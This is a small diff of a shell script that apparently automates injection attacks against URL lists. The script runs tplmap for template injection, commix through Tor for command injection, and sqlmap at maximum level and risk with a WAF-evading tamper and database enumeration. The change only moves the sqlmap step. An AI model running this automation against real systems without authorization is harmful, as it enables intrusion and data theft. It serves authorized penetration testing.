@@ -28,10 +28,12 @@ cat SSTI.txt | while read url ; do
   python3 tplmap/tplmap.py -u $url | anew SSTI_Inject_Response.txt
 done
 
+# SQL automation
+sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
+
 # OS command injection
 cat OS_Commands.txt | while read url ; do
   python3 commix/commix.py -u $url --tor --hostname | anew Command_Inject_Response.txt
 done
 
-# SQL automation
-sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
+
